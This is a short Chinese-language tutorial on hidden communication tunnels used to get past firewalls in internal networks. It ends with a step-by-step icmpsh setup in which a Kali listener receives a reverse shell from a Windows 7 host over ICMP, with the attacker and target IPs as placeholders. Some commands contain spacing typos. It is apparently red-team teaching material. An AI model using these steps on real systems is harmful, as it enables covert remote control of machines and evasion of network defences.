一、隐藏通信隧道
1. 概述
什么是隧道，隧道就是一种绕过端口屏蔽的通信方式。
常见的隧道如下：
  • 网络层：IPV6隧道、ICMP隧道、GRE隧道。
  • 传输层：TCP隧道、UDP隧道、常规端口转发。
  • 应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道。
2. 判断内网的连通性
  • ICMP协议
ping <ip或域名>
  • TCP协议
nc <ip 端口号>
  • HTTP协议
curl <ip或域名 端口号>
  • DNS协议
nslookup <域名>‍
dig <域名>

3. 网络层隧道技术
  • IPV6隧道
IPV6隧道技术是指通过IPV4隧道传送IPV6数据报文的技术。现在很多边界设备、防火墙、入侵防御系统还无法识别IPV6的通信数据，而大多操作系统都支持IPV6。
  • ICMP隧道
通过ping命令访问远程计算机，尝试建立ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙。
常用的ICMP隧道工具有icmpsh。

  • 下载icmpsh

  • 安装python的impacket类库

apt-getinstall python-impacket

  • Icmp工具要替代系统本身的ping命令的应答程序，所以要关闭本地系统的icmp应答。

sysctl -wnet.ipv4.icmp_echo_ignore_all=1

  • 在kali上开始监听

python icmpsh_m.py 攻击ip 目标ip

  • 在win7执行

icmpsh.exe -t 攻击IP

  • 反弹shell到kali
